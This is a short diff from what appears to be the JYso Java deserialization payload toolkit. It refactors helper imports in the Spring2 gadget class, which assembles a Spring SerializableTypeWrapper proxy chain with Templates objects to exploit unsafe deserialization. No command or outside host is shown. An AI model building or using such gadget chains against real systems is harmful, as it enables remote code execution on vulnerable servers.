@@ -11,7 +11,7 @@ import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
 
-import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
+import static com.qi4l.JYso.gadgets.utils.Utils.*;
 import static java.lang.Class.forName;
 
 /**
@@ -49,8 +49,8 @@ public class Spring2 implements ObjectPayload<Object> {
                 Type.class,
                 Templates.class);
 
-        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
-                Gadgets.createMap("getType", typeTemplatesProxy),
+        final Object typeProviderProxy = createMemoitizedProxy(
+                createMap("getType", typeTemplatesProxy),
                 forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
         Object mitp = Reflections.createWithoutConstructor(forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"));
